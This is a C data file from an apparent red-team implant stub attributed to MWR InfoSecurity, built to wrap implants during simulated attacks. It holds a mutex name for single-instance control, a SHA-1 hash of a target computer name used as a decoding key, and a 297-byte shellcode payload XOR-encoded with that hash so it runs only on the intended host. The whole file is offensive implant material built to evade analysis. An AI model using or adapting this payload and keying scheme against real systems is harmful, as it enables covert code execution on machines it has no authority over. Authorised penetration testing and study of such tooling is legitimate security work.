// ------------------------------------------------------------------------------
//
//  Implant Stub Code - C (Visual Studio) Executable
//  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
//  MWR InfoSecurity Ltd, MWR Labs
//
//  This code is designed to act as a wrapper for existing implants during simulated
//  attacks.
//
//  Compile this using Visual Studio 2013.
//
//  This file stores the name of the mutex (which allows the implant stub to tell
//  whether it is already running), a hash of the computer name and the raw shellcode
//  to execute.
//
// ------------------------------------------------------------------------------

// The mutex name. Just pick something unique.
// Prefixing it with Global\\ makes it unique on the system (i.e. all users).
// Prefixing it with Local\\ makes it unique to the session (i.e. that user).
#define MUTEX_NAME TEXT("Global\\Stufus")

// This will always be 20 (byte length of an SHA-1 hash)
#define HASH_LEN 20

// This is the hash of: TESTER
// You can generate this with raw2src.py. e.g. ./raw2src.py -c STUFUS -o C
BYTE hashSHA1ComputerName[] = 
"\x53\x8f\x68\xf9\x2c\xa3\x76\xe5\x23\xe6\xd6\xa9\x68\x63\xde\x02\x7d\x76\xa3\xda";
#define hashSHA1ComputerNamelen 20

// This is the encoded shellcode
// You can generate this with raw2src.py. e.g. ./raw2src.py -s shellcode.raw -x "MWRINFOSECURITY.COM" -o C 
// Shellcode loaded from: ../shellcode-implant-stub/shellcode.raw
// Shellcode XOR'd with hash of: TESTER
BYTE shellcode[] =
"\x8a\x64\xf3\x20\x58\x87\x82\xd4\xf1\x54\xa1\x98\xa1\x07\x55\x73\x4d\xfd\xd5\xd6"
"\xd8\xf9\x74\x72\x6a\xab\xfd\x9b\x03\x6d\xe0\x91\x27\x7b\xab\xf1\x24\x77\x72\x25"
"\xb2\xef\xe3\x95\x08\x87\xfd\xa0\x1f\x6d\x82\x81\x10\x62\x34\x89\x37\x6e\x28\x80"
"\x73\x8e\x83\x1a\x18\xea\xfd\xd1\xa8\xe7\x38\x98\x97\x52\x1e\xfe\xd1\xf2\x63\xae"
"\x54\x4e\xa7\xf4\x2d\x64\x9d\x11\x18\x9a\xf2\x81\x1d\x82\x55\x58\x59\x77\x48\xbc"
"\xd8\x83\x23\x72\x76\xbf\x77\x0e\xa8\xe2\x5d\xa8\x80\xea\x9a\x26\x61\x17\x60\x68"
"\x5b\xa6\xbc\x70\xc9\x2a\xb4\x8d\xad\xa8\xd8\x45\x3a\x8b\x41\xfd\x82\x89\x2a\x9f"
"\x57\x34\x16\x21\xce\xd0\xf1\xf9\x07\xb4\x3e\x27\x97\x9c\x21\x8b\x38\x7e\xcb\xb6"
"\x3f\xaf\x29\x91\x1f\x91\x58\x81\x4b\x93\xa5\xcc\x1a\x53\x05\x8a\x21\x52\xa9\x53"
"\xb5\xd9\x97\xac\x28\x2a\xb4\xb5\x98\x4e\x74\xe4\xd4\xe4\xc2\x26\x2f\x9e\xfc\x25"
"\xac\x70\x00\xa1\x0c\x83\x56\x8d\x56\x80\xa3\xda\x00\x16\xb5\x71\x09\x1e\x83\xf5"
"\x73\xcf\x00\xb5\x4d\xc1\x05\x8d\x6e\xb1\x84\x89\x59\xb8\x56\x5e\x59\x62\x2a\x39"
"\x3b\xd7\x48\xd9\x0c\xcb\x03\x91\x46\x82\xbe\xcc\x10\x06\xbd\x6a\x15\x17\xd0\xfa"
"\x3b\xe0\x09\x9d\x0c\xcb\x06\x84\x5a\x8a\xbe\xfd\x00\x06\xfe\x33\xb4\xfe\xef\xfe"
"\x4b\x06\x89\xc8\xfe\xf1\x25\xb4\x71\x19\x06\x98\xa8\x33\x21\x57\x75";
#define shellcodelen 297